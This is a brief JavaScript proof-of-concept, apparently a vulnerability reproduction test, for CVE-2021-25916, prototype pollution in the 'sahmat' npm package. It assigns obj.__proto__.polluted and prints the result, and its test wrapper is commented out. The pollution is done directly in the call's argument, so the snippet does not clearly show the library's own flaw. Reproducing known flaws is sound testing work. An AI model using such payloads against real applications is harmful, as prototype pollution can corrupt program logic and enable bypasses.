// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
// test("prototype pollution in sahmat", () => {
  const sahmat = require("sahmat");
  let obj = { tmp: "" };

console.log({}.polluted);

  sahmat(obj, "tmp", (obj.__proto__.polluted = "yes"));

console.log("{ " + obj.tmp.polluted + ", " + "yes" + " }");
// });
